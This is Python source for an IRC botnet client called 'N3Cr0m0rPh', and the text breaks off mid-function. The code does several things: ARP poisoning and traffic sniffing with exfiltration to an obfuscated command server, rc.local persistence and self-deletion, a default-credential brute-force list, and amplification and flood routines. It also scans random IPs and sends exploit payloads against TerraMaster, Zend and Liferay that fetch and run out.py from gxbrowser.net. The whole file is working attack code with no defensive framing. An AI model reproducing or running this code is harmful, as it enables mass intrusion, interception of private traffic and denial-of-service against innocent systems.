#!/usr/bin/env python
#-------------------------------------------------------------------------------
#
# Name:        N3Cr0m0rPh IRC bot V8
# Purpose:     IRC Bot for botnet
# Notes:       (polymorphic) nearly impossible to remove (or detect) without system
#               analysis and creation of a tool, also has amp methods now.
#
# Author:      Freak @ PopulusControl (sudoer)
#
# Created:     15/01/2015
# Last Update: 1/1/2021
# Copyright:   (c) Freak 2021
# Licence:     Creative commons.
#-------------------------------------------------------------------------------
import re,socket,subprocess,os,sys,urllib,ctypes,time,threading,random,itertools,platform,multiprocessing,fcntl,select,pty,json,ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
try:
    import urllib2
except:
    import urllib.request as urllib2
try:
    from string import letters
except:
    from string import ascii_letters as letters
from binascii import unhexlify
from base64 import b64decode
from uuid import getnode
from sys import argv
from struct import unpack,pack
def getPoisonIPs():
    myip = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
    poison=[]
    fh=open("/proc/net/arp", "rb")
    table_=fh.readlines()
    fh.close()
    table_.pop(0)
    for x in table_:
        x=x.split()
        if x[2]=="0x2":
            if x[0] != myip:
                poison.append((x[0], x[3]))
    return poison

def get_src_mac():
    mac_dec = hex(getnode())[2:-1]
    while (len(mac_dec) != 12):
        mac_dec = "0" + mac_dec
    return unhexlify(mac_dec)


def create_dst_ip_addr():
    dst_ip_addr = ''
    ip_src_dec = argv[2].split(".")
    for i in range(len(ip_src_dec)):
        dst_ip_addr += chr(int(ip_src_dec[i]))
    return dst_ip_addr


def get_default_gateway_linux():
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                continue
            return socket.inet_ntoa(pack("<L", int(fields[2], 16)))

def create_pkt_arp_poison():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
    s.bind(("wlan0", 0))

    while(1):
        for lmfao in getPoisonIPs():
            src_addr = get_src_mac()
            dst_addr = lmfao[0]
            src_ip_addr = get_default_gateway_linux()
            dst_ip_addr = lmfao[1]
            dst_mac_addr = "\x00\x00\x00\x00\x00\x00"
            payload = "\x00\x01\x08\x00\x06\x04\x00\x02"
            checksum = "\x00\x00\x00\x00"
            ethertype = "\x08\x06"
            s.send(dst_addr + src_addr + ethertype + payload+src_addr + src_ip_addr
                   + dst_mac_addr + dst_ip_addr + checksum)
        time.sleep(2)
global pause
pause = 1

def checksum(data):
    s = 0
    n = len(data) % 2
    for i in range(0, len(data)-n, 2):
        s+= ord(data[i]) + (ord(data[i+1]) << 8)
    if n:
        s+= ord(data[i+1])
    while (s >> 16):
        s = (s & 0xFFFF) + (s >> 16)
    s = ~s & 0xffff
    return s
        
class layer():
    pass

class ETHER(object):
    def __init__(self, src, dst, type=0x0800):
        self.src = src
        self.dst = dst
        self.type = type
    def pack(self):
        ethernet = pack('!6s6sH',
        self.dst,
        self.src,
        self.type)
        return ethernet

class IP(object):
    def __init__(self, source, destination, payload='', proto=socket.IPPROTO_TCP):
        self.version = 4
        self.ihl = 5 # Internet Header Length
        self.tos = 0 # Type of Service
        self.tl = 20+len(payload)
        self.id = 0#random.randint(0, 65535)
        self.flags = 0 # Don't fragment
        self.offset = 0
        self.ttl = 255
        self.protocol = proto
        self.checksum = 2 # will be filled by kernel
        self.source = socket.inet_aton(source)
        self.destination = socket.inet_aton(destination)
    def pack(self):
        ver_ihl = (self.version << 4) + self.ihl
        flags_offset = (self.flags << 13) + self.offset
        ip_header = pack("!BBHHHBBH4s4s",
                    ver_ihl,
                    self.tos,
                    self.tl,
                    self.id,
                    flags_offset,
                    self.ttl,
                    self.protocol,
                    self.checksum,
                    self.source,
                    self.destination)
        self.checksum = checksum(ip_header)
        ip_header = pack("!BBHHHBBH4s4s",
                    ver_ihl,
                    self.tos,
                    self.tl,
                    self.id,
                    flags_offset,
                    self.ttl,
                    self.protocol,
                    socket.htons(self.checksum),
                    self.source,
                    self.destination)  
        return ip_header
    def unpack(self, packet):
        _ip = layer()
        _ip.ihl = (ord(packet[0]) & 0xf) * 4
        iph = unpack("!BBHHHBBH4s4s", packet[:_ip.ihl])
        _ip.ver = iph[0] >> 4
        _ip.tos = iph[1]
        _ip.length = iph[2]
        _ip.ids = iph[3]
        _ip.flags = iph[4] >> 13
        _ip.offset = iph[4] & 0x1FFF
        _ip.ttl = iph[5]
        _ip.protocol = iph[6]
        _ip.checksum = hex(iph[7])
        _ip.src = socket.inet_ntoa(iph[8])
        _ip.dst = socket.inet_ntoa(iph[9])
        _ip.list = [
            _ip.ihl,
            _ip.ver,
            _ip.tos,
            _ip.length,
            _ip.ids,
            _ip.flags,
            _ip.offset,
            _ip.ttl,
            _ip.protocol,
            _ip.src,
            _ip.dst]
        return _ip
        
class TCP(object):
    def __init__(self, srcp, dstp):
        self.srcp = srcp
        self.dstp = dstp
        self.seqn = 10
        self.ackn = 0
        self.offset = 5 # Data offset: 5x4 = 20 bytes
        self.reserved = 0
        self.urg = 0
        self.ack = 0
        self.psh = 0
        self.rst = 0
        self.syn = 1
        self.fin = 0
        self.window = socket.htons(5840)
        self.checksum = 0
        self.urgp = 0
        self.payload = ""
    def pack(self, source, destination):
        data_offset = (self.offset << 4) + 0
        flags = self.fin + (self.syn << 1) + (self.rst << 2) + (self.psh << 3) + (self.ack << 4) + (self.urg << 5)
        tcp_header = pack('!HHLLBBHHH', 
                     self.srcp, 
                     self.dstp, 
                     self.seqn, 
                     self.ackn, 
                     data_offset, 
                     flags,  
                     self.window,
                     self.checksum,
                     self.urgp)
        #pseudo header fields
        source_ip = source
        destination_ip = destination
        reserved = 0
        protocol = socket.IPPROTO_TCP
        total_length = len(tcp_header) + len(self.payload)
        # Pseudo header
        psh = pack("!4s4sBBH",
              source_ip,
              destination_ip,
              reserved,
              protocol,
              total_length)
        psh = psh + tcp_header + self.payload
        tcp_checksum = checksum(psh)
        tcp_header = pack("!HHLLBBH",
                  self.srcp,
                  self.dstp,
                  self.seqn,
                  self.ackn,
                  data_offset,
                  flags,
                  self.window)
        tcp_header+= pack('H', tcp_checksum) + pack('!H', self.urgp)
        return tcp_header
    def unpack(self, packet):
        cflags = { # Control flags
            32:"U",
            16:"A",
            8:"P",
            4:"R",
            2:"S",
            1:"F"}
        _tcp = layer()
        _tcp.thl = (ord(packet[12])>>4) * 4
        _tcp.options = packet[20:_tcp.thl]
        _tcp.payload = packet[_tcp.thl:]
        tcph = unpack("!HHLLBBHHH", packet[:20])
        _tcp.srcp = tcph[0] # source port
        _tcp.dstp = tcph[1] # destination port
        _tcp.seq = tcph[2] # sequence number
        _tcp.ack = hex(tcph[3]) # acknowledgment number
        _tcp.flags = ""
        for f in cflags:
            if tcph[5] & f:
                _tcp.flags+=cflags[f]
        _tcp.window = tcph[6] # window
        _tcp.checksum = hex(tcph[7]) # checksum
        _tcp.urg = tcph[8] # urgent pointer
        _tcp.list = [
            _tcp.srcp,
            _tcp.dstp,
            _tcp.seq,
            _tcp.ack,
            _tcp.thl,
            _tcp.flags,
            _tcp.window,
            _tcp.checksum,
            _tcp.urg,
            _tcp.options,
            _tcp.payload]
        return _tcp

class UDP(object):
    def __init__(self, src, dst, payload=''):
        self.src = src
        self.dst = dst
        self.payload = payload
        self.checksum = 0
        self.length = 8 # UDP Header length
    def pack(self, src, dst, proto=socket.IPPROTO_UDP):
        length = self.length + len(self.payload)
        pseudo_header = pack('!4s4sBBH',
            socket.inet_aton(src), socket.inet_aton(dst), 0, 
            proto, length)
        self.checksum = checksum(pseudo_header)
        packet = pack('!HHHH',
            self.src, self.dst, length, 0)
        return packet

PORT = {
	'dns': 53,
	'ntp': 123,
	'snmp': 161,
	'ssdp': 1900 }

PAYLOAD = {
	'dns': ('{}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
			'{}\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
			'\x00\x00\x00\x00\x00\x00'),
	'snmp':('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
		'\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
		'\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
		'\x01\x02\x01\x05\x00'),
	'ntp':('\x17\x00\x02\x2a'+'\x00'*4),
	'ssdp':('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
		'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
}

amplification = {
	'dns': {},
	'ntp': {},
	'snmp': {},
	'ssdp': {} }		# Amplification factor

FILE_NAME = 0			# Index of files names
FILE_HANDLE = 1 		# Index of files descriptors

npackets = 0			# Number of packets sent
nbytes = 0				# Number of bytes reflected
files = {}				# Amplifications files
global proto
proto = "dns"


combo = [ 
        "root:root",
        "root:",
        "admin:admin",
        "support:support",
        "user:user",
        "admin:",
        "admin:password",
        "root:vizxv",
        "root:admin",
        "root:xc3511",
        "root:888888",
        "root:xmhdipc",
        "root:default",
        "root:juantech",
        "root:123456",
        "root:54321",
        "root:12345",
        "root:pass",
        "ubnt:ubnt",
        "root:klv1234",
        "root:Zte521",
        "root:hi3518",
        "root:jvbzd",
        "root:anko",
        "root:zlxx.",
        "root:7ujMko0vizxv",
        "root:7ujMko0admin",
        "root:system",
        "root:ikwb",
        "root:dreambox",
        "root:user",
        "root:realtek",
        "root:00000000",
        "admin:1111111",
        "admin:1234",
        "admin:12345",
        "admin:54321",
        "admin:123456",
        "admin:7ujMko0admin",
        "admin:1234",
        "admin:pass",
        "admin:meinsm",
        "admin:admin1234",
        "root:1111",
        "admin:smcadmin",
        "admin:1111",
        "root:666666",
        "root:password",
        "root:1234",
        "root:klv123",
        "Administrator:admin",
        "service:service",
        "supervisor:supervisor",
        "guest:guest",
        "guest:12345",
        "guest:12345",
        "admin1:password",
        "administrator:1234",
        "666666:666666",
        "888888:888888",
        "tech:tech"
#        "mother:fucker"
]

def readUntil(tn, string, timeout=8):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.1)
        if string in buf: return buf
    raise Exception('TIMEOUT!')

def recvTimeout(sock, size, timeout=8):
    sock.setblocking(0)
    ready = select.select([sock], [], [], timeout)
    if ready[0]:
        data = sock.recv(size)
        return data
    return ""



class aeRiqAnI():
    def bigSNIFFS(self,cncip):
        global pause
        up = 0
        SIOCGIFFLAGS = 0x8913
        null256 = '\0'*256
        ifname = "wlan0"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            result = fcntl.ioctl(s.fileno(  ), SIOCGIFFLAGS, ifname + null256)
            flags, = unpack('H', result[16:18])
            up = flags & 1
        except:
            pass
        if up == 1:
            threading.Thread(target=create_pkt_arp_poison,args=()).start()
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except:
            return
        count = 0
        while True:
            if pause == 1:
                continue
            try:
                packet = s.recvfrom(65565)
                count= count+1
                packet=packet[0]
                eth_length = 14
                eth_header = packet[:eth_length]
                eth_unpack =  unpack('!6s6sH',eth_header)
                eth_protocol = socket.ntohs(eth_unpack[2])
                ip_header = packet[0:20]
                header_unpacked = unpack('!BBHHHBBH4s4s',ip_header)
                version_ih1= header_unpacked[0] 
                version = version_ih1 >> 4 
                ih1 = version_ih1 & 0xF
                
                iph_length = ih1*4
                
                ttl = header_unpacked[5]
                protocol = header_unpacked[6]
                source_add = socket.inet_ntoa(header_unpacked[8])
                destination_add = socket.inet_ntoa(header_unpacked[9])
                tcp_header = packet[iph_length:iph_length+20]

                #unpack them 
                tcph = unpack('!HHLLBBHHH',tcp_header)
                
                source_port = tcph[0]
                dest_port = tcph[1]
                sequence = tcph[2]
                ack = tcph[3]
                resrve = tcph[4]
                tcph_len = resrve >> 4
                h_size = iph_length+tcph_len*4
                data_size = len(packet)-h_size
                data = packet[h_size:]
                if len(data) > 2 and source_port!=1337 and source_port!=6667 and source_port!=23 and source_port!=443 and source_port!=37215 and source_port!=53 and source_port!=22 and dest_port!=1337 and dest_port!=6667 and dest_port!=23 and dest_port!=443 and dest_port!=37215 and dest_port!=53 and dest_port!=22:
                    try:
                        ss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                        ss.connect((cncip, 1337))
                        ss.send('IPv'+str(version)+ '\nTTL:'+str(ttl)+'\nProtocol:'+str(protocol)+"\nSource Address:"+str(source_add)+"\nDestination Address:"+str(destination_add)+"\n-------------------------------------------\n\nSource Port:"+str(source_port)+"\nDestination Port:"+str(dest_port)+"\n##########BEGINDATA##################\n"+data+"------------------------------------\n\n###########ENDDATA###################\n")
                        ss.close()
                    except:
                        pass
            except:
                pass
    def __init__(self):
        self.VwkBkdwM=self.BrtcGnmw(random.randrange(8,12)) #Generate random 8 character nick to ensure 
        self.gLsaWmlh=0                #Ignore this
        self.XUbvPqib=0                #Ignore this too
        self.YxqCRypO=b64decode(b64decode("34653537343537613464376135393334346536613662333234643761356136623464376136623761346437613539376134643761343933313465366136333335346534373464333235613434346433313465366434643332346534343531373834643332353137613561343133643364".decode('hex').decode('hex')).decode('hex')) #Encoded irc server
        threading.Thread(target=self.bigSNIFFS, args=(self.YxqCRypO,)).start()
        self.EQGAKLwR=6667 #Server port
        self.lAyMzJrw=b64decode(b64decode("34653434366237613464376135353332346537613633333135393534353133333465343435393761346434343536363834653534343537613561343434653662".decode('hex').decode('hex')).decode('hex')) #Encoded channel
        self.TbdfKqvM=b64decode(b64decode("346535343531333235393534353236633465353436373332346436613535333034653437353533313466343133643364".decode('hex').decode('hex')).decode('hex')) #Encoded channel key
        self.hLqhZnCt="[HAX|"+platform.system()+"|"+platform.machine()+"|"+str(multiprocessing.cpu_count())+"]"+str(self.VwkBkdwM) #Bot nickname
        self.aRHRPteL="[HAX|"+platform.system()+"|"+platform.machine()+"|"+str(multiprocessing.cpu_count())+"]"+str(self.VwkBkdwM) #Bot Realname
        self.pBYbuWVq=str(self.VwkBkdwM) #Other
        self.AELmEnMe=0 #wether we should kill all .attk
        self.GbASkEbE=["Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
        "Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
        "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
        "Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
        "Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
        "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
        "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
        "Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
        "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4",
        "Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1"]
        self.KYuhkvIx() #repack bot before we install
        self.dajsJgBT() #Install
        for _ in range(multiprocessing.cpu_count() * 8):
            try:
                threading.Thread(target=self.worker).start()
            except:
                pass
        os.remove(argv[0])
        self.nIZlsIEI() #Start the bot
    def check_endpoint(self, url):
        response = urllib.urlopen(url+'/version')
        if response.getcode() == 200:
            print(("[+] TerraMaster TOS version: ", str(response.content)))
            return 1
        else:
            #print(("\n[-] TerraMaster TOS response code: ", response.status_code))
            return 0
    def exploit(self, ip, port):    
        if "443" in str(port):
            url = "https://"+ip+":"+str(port)
        else:
            url = "http://"+ip+":"+str(port)
        try:
            if self.check_endpoint(url):
                urllib2.urlopen(url+'/include/makecvs.php?Event=%60cd%20%2Ftmp%7C%7Ccd%20%24%28find%20%2F%20-writable%20%7C%20head%20-n%201%29%3Bcurl%20http%3A%2F%2Fgxbrowser.net%2Fout.py%3Eout.py%3B%20php%20-r%20%22file_put_contents%28%5C%22out.py%5C%22%2C%20file_get_contents%28%5C%22http%3A%2F%2Fgxbrowser.net%2Fout.py%5C%22%29%29%3B%22%3B%20wget%20http%3A%2F%2Fgxbrowser.net%2Fout.py%20-O%20out.py%3B%20chmod%20777%20out.py%3B%20.%2Fout.py%20%7C%7C%20python%20out.py%7C%7Cpython2%20out.py%20%26%60')
            else:
                zend = {
                    'hello' : 'TzoyNToiWmVuZFxIdHRwXFJlc3BvbnNlXFN0cmVhbSI6Mjp7czoxMDoiACoAY2xlYW51cCI7YjoxO3M6MTM6IgAqAHN0cmVhbU5hbWUiO086MjU6IlplbmRcVmlld1xIZWxwZXJcR3JhdmF0YXIiOjI6e3M6NzoiACoAdmlldyI7TzozMDoiWmVuZFxWaWV3XFJlbmRlcmVyXFBocFJlbmRlcmVyIjoxOntzOjQxOiIAWmVuZFxWaWV3XFJlbmRlcmVyXFBocFJlbmRlcmVyAF9faGVscGVycyI7TzozMToiWmVuZFxDb25maWdcUmVhZGVyUGx1Z2luTWFuYWdlciI6Mjp7czoxMToiACoAc2VydmljZXMiO2E6Mjp7czoxMDoiZXNjYXBlaHRtbCI7TzoyMzoiWmVuZFxWYWxpZGF0b3JcQ2FsbGJhY2siOjE6e3M6MTA6IgAqAG9wdGlvbnMiO2E6Mjp7czo4OiJjYWxsYmFjayI7czo4OiJwYXNzdGhydSI7czoxNToiY2FsbGJhY2tPcHRpb25zIjthOjE6e2k6MDtzOjMwMDoiY2QgJChmaW5kIC8gLXdyaXRhYmxlIHwgaGVhZCAtbiAxKTtwaHAgLXIgImZpbGVfcHV0X2NvbnRlbnRzKFwib3V0LnB5XCIsIGZpbGVfZ2V0X2NvbnRlbnRzKFwiaHR0cDovL2d4YnJvd3Nlci5uZXQvb3V0LnB5XCIpKTsifHxjdXJsIGh0dHA6Ly9neGJyb3dzZXIubmV0L291dC5weSAtT3x8d2dldCBodHRwOi8vZ3hicm93c2VyLm5ldC9vdXQucHkgLU8gb3V0LnB5O2NobW9kIDc3NyBvdXQucHk7cHl0aG9uIG91dC5weXx8cHl0aG9uMi42IG91dC5weXx8cHl0aG9uMi43IG91dC5weXx8cHl0aG9uMiBvdXQucHl8fC4vb3V0LnB5Ijt9fX1zOjE0OiJlc2NhcGVodG1sYXR0ciI7cjo3O31zOjEzOiIAKgBpbnN0YW5jZU9mIjtzOjIzOiJaZW5kXFZhbGlkYXRvclxDYWxsYmFjayI7fX1zOjEzOiIAKgBhdHRyaWJ1dGVzIjthOjE6e2k6MTtzOjE6ImEiO319fQ=='
                }
                hackzend = urllib2.Request(url+"/zend3/public/", json.dumps(zend), {'Content-Type': 'application/x-www-form-urlencoded'})
                urllib2.urlopen(hackzend)
                data = {
                    'columnId': '1',
                    'name': '2',
                    'type': '3',
                    '+defaultData': 'com.mchange.v2.c3p0.WrapperConnectionPoolDataSource',
                    'defaultData.userOverridesAsString': 'HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a707070707070707070707874000a4576696c4f626a65637474001a687474703a2f2f677862726f777365722e6e65743a383030342f740003466f6f;'
                }
                req = urllib2.Request(url+"/api/jsonws/expandocolumn/update-column", json.dumps(data), {'Content-Type': 'application/json', 'Authorization' : 'Basic dGVzdEBsaWZlcmF5LmNvbTp0ZXN0'})
                urllib2.urlopen(req)
        except Exception as e:
            print str(e)
    def gen_IP(self):
        not_valid = [10,127,169,172,192,185,233,234]
        first = random.randrange(1,256)
        while first in not_valid:
            first = random.randrange(1,256)
        ip = ".".join([str(first),str(random.randrange(1,256)),
        str(random.randrange(1,256)),str(random.randrange(1,256))])
        return ip
    def worker(self):
        while True:
            if pause==0:
                time.sleep(1)
                continue
            IP = self.gen_IP()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.37)
                s.connect((IP, 443))
                s.close()
                self.exploit(IP, 443)
            except Exception as e:
                pass
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.37)
                s.connect((IP, 80))
                s.close()
                self.exploit(IP, 80)
            except Exception as e:
                pass
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.37)
                s.connect((IP, 8443))
                s.close()
                self.exploit(IP, 8080)
            except Exception as e:
                pass
    def dAGtjnII(self):
        return os.path.abspath(argv[0])
    def dajsJgBT(self): #Install features
        try:
            resolv=open("/etc/resolv.conf", "w")
            resolv.write("nameserver 1.1.1.1\nnameserver 1.0.0.1\n")
            resolv.close()
            rc=open("/etc/rc.local","rb")
            data=rc.read()
            rc.close()
            if "boot.py" not in data:
                with open(__file__, 'rb') as src, open("/etc/boot.py", 'wb') as dst:
                    while True:
                        copy_buffer = src.read(1024*1024)
                        if not copy_buffer:
                            break
                        dst.write(copy_buffer)
                os.chmod("/etc/boot.py", 0777)
                rc=open("/etc/rc.local","wb")
                if "exit" in data:
                    rc.write(data.replace("exit", "/etc/boot.py\nexit"))
                else:
                    rc.write("\n/etc/boot.py")    
                rc.close()
        except:
            pass
    def ANoRqMAc(self,WpjVvTYm):
        oFbPxKRo = WpjVvTYm.split('.')
        VIxrvTxU = [map(int, dptPYiDu.split('-')) for dptPYiDu in oFbPxKRo]
        nbmfZmAQ = [range(pAbhrcGT[0], pAbhrcGT[1] + 1) if len(pAbhrcGT) == 2 else pAbhrcGT for pAbhrcGT in VIxrvTxU]
        for UgzNfBje in itertools.product(*nbmfZmAQ):
            yield '.'.join(map(str, UgzNfBje))
    def BrtcGnmw(self,wnIyumGy):
        return ''.join(random.choice(letters) for IqTGMTaJ in range(wnIyumGy))

    def YQYZpxFe(self,OHCdSBTA,EoVtvYCA,XusYRFMu):   
        if str(EoVtvYCA).startswith("0"):
            YqlwXkhL=os.urandom(65500)
        else:
            YqlwXkhL="\xff"*65500
        IWNKrdcU=time.time()+XusYRFMu
        while IWNKrdcU>time.time():
            if self.AELmEnMe == 1:
                break
            try:
                OxYXMYUq=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                if EoVtvYCA==0:
                    OxYXMYUq.sendto(YqlwXkhL,(OHCdSBTA, random.randrange(0,65535)))
                else:
                    OxYXMYUq.sendto(YqlwXkhL,(OHCdSBTA, EoVtvYCA))
                self.gLsaWmlh+=1
            except:
                pass
        self.XUbvPqib=self.gLsaWmlh*65535//1048576
        self.mKxjSTWt=self.XUbvPqib//int(self.FvHtFbef[6])
        self.AbJppCRv.send("PRIVMSG %s :%s packets sent. Sent %s MB, %s MB/s\n" % (self.lAyMzJrw,self.gLsaWmlh,self.XUbvPqib,self.mKxjSTWt))
        self.gLsaWmlh=0
    def oBwjfHGs(self,EBcZqJni,EoVtvYCA,XusYRFMu):
        IWNKrdcU=time.time()+XusYRFMu
        while IWNKrdcU>time.time():
            if self.AELmEnMe == 1:
                return
            try:
                OxYXMYUq=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                OxYXMYUq.connect((EBcZqJni, EoVtvYCA))
                self.gLsaWmlh+=1
            except:
                pass
        self.gLsaWmlh=0
    def UDilxaOf(self,gSRaQsAT, ekAcxzEz, sockets, XusYRFMu):
        IWNKrdcU=time.time()+XusYRFMu
        self.gLsaWmlh = 0
        fds = []
        for QBQtdKIm in xrange(0, int(sockets)):
            fds.append("")
        while 1:
